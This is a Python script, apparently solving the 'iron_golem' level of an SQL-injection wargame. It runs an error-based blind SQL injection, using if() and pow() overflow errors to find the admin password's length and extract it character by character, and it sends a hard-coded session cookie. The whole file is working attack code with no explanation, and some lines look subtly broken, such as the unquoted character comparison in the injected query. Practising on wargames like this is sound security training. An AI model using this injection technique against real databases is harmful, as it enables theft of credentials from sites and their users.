import requests

pw = ""
pw_length = ""

url = "http://los.rubiya.kr/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"

headers = {
    "Cookie":"PHPSESSID=pkpf9vsq7hhb1tu5lg6dlpomf7"
    
}

#find admin pw length: 68
'''
for i in range(1,80):
    params = {

        #"pw":"' or id='admin' and if(length(pw)=%d,(select 1 union select 2),'hackyu')#" % i
        "pw":"' or id='admin' and if(length(pw)=%d,pow(2,1000000),'hackyu')#" % i
    }
    res = requests.get(url, params=params, headers=headers)
    #if "more than" in res.content:
    #    print i 
    #if "hackyu" not in res.content:
    #    print i
    if "out of range" in res.content:
        pw_length = i

print "pw_length=",pw_length
'''

for i in range(1,69):
    for j in range(0x20, 0x7f):
        # # $ % ^ & * ! 
        if chr(j) == '#' or chr(j) == '$' or chr(j) == '%' or chr(j) == '^' or chr(j) == '&' or chr(j) == '*':
            continue
        
        params = {
            "pw":"' or id='admin' and if(substr(pw,%d,1)=%c,pow(2,2000000),'false')#" % (i,j)
        }    
        
        print "[Try index:%d , value:%c ]" % (i,chr(j))
        res = requests.get(url, params=params, headers=headers)
        try:
            if "range" in res.content:
                print "Found it!----> index: %d, valye: %c" % (i,chr(j))
                pw = pw+chr(j)
                break
        except Exception as e:
                j = j-0x1

print pw
